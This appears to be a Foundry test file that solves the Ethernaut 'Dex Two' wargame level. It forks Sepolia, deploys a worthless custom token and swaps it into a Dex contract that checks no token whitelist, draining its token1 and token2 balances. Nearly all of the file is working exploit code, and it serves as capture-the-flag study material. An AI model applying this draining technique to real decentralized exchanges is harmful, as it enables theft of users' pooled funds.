// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {ERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
interface Dex {
    function swap(address from, address to, uint256 amount) external;

    function token1() external view returns (address);

    function token2() external view returns (address);

    function approve(address spender, uint256 amount) external;

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);
}
contract DexTwoAttackerTest is Test {
    Dex dex;
    IERC20 token1;
    IERC20 token2;
    SwappableTokenTwo token3;

    address player = 0x6278A1E803A76796a3A1f7F6344fE874ebfe94B2;
    function setUp() external {
        // 配置 fork url; SEPOLIA_RPC_URL 为 .env 文件中的环境变量
        uint256 forkId = vm.createFork(
            vm.envString("SEPOLIA_RPC_URL"),
            6337652
        );
        vm.selectFork(forkId);

        dex = Dex(0xfFb3c433e38433D8f2032FCf09fB3547949A0f8f);
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());

        vm.startPrank(player);
        token3 = new SwappableTokenTwo(address(dex), "Token3", "T3", 100);
        token3.transfer(address(dex), 1);
        token3.approve(player, address(dex), 100);
    }

    function testInfo() external view {
        console.log("token1: ", address(token1));
        console.log("token2: ", address(token2));
    }

    function testSwap() external {
        vm.startPrank(player);
        dex.approve(address(dex), UINT256_MAX);
        console.log("Before token1 in Dex:", token1.balanceOf(address(dex)));
        dex.swap(address(token3), address(token1), 1);
        console.log("After token1 in Dex:", token1.balanceOf(address(dex)));

        console.log("Before token2 in Dex:", token2.balanceOf(address(dex)));
        dex.swap(address(token3), address(token2), 2);
        console.log("After token2 in Dex:", token2.balanceOf(address(dex)));

        assertEq(
            token1.balanceOf(address(dex)) == 0 &&
                token2.balanceOf(address(dex)) == 0,
            true
        );

        vm.stopPrank();
    }
}

// forge test --match-contract DexTwoAttackerTest -vvv
